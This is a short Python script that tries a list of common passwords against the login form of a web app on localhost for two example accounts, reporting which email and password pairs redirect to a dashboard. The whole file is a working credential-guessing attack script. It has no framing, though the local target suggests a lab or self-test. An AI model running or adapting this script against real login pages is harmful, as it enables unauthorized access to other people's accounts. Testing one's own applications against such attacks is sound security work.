import requests

url = 'http://127.0.0.1:5000/'

users = {
    "alice@example.com": ["123456", "password123", "alice123"],
    "bob@example.com": ["123456", "qwerty", "bob123"]
}

for email, passwords in users.items():
    for password in passwords:
        response = requests.post(
            url,
            data={
                'email': email,
                'password': password
            },
            allow_redirects=False
        )

        if response.status_code == 302 and response.headers['Location'] == '/dashboard':
            print(f"SUCCESS: {email}:{password}")
            break
        else:
            print(f"FAILED: {email}:{password}")
